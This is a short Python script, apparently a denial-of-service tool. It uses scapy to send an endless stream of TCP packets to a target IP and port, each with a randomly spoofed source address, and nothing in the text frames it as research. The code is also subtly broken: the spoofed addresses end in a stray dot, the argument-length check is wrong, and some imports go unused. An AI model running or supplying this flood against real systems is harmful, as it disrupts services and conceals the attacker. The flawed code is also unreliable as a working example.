#! /usr/bin/env python

import sys
from scapy.all import sr1,IP,ICMP, TCP, send
from pymongo import MongoClient
from random import randint

dstIp = sys.argv[1]
if(len(sys.argv) > 1):
    dstPrt = sys.argv[2]
else:
    dstPrt = 80
dstPrt = int(dstPrt)
while 1:
    rand1 = randint(1,254)
    rand2 = randint(1,254)
    rand3 = randint(1,254)
    rand4 = randint(1,254)
    srcIp = '' + str(rand1) + '.' + str(rand2) + '.' + str(rand3) + '.' + str(rand4) + '.'
    print srcIp
    p = send(IP(src=srcIp, dst=dstIp)/TCP(dport=dstPrt))



